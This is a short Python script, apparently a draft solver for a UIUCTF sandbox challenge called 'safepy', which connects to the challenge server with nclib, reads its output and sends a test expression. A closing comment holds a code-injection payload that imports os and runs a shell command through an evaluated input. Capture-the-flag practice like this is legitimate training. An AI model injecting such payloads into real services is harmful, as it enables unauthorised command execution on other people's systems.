from re import T
import nclib

# nc safepy.chal.uiuc.tf 1337
HOST="safepy.chal.uiuc.tf"
PORT=1337

nc = nclib.Netcat((HOST, PORT))
while 1:
    data = nc.recv_all()
    if len(data) < 1:
        break
    print(str(data))
    print("a")

print("b")
nc.sendall("1+1")
print(nc.recv(1024))

# __import__("os").system("ls/ ")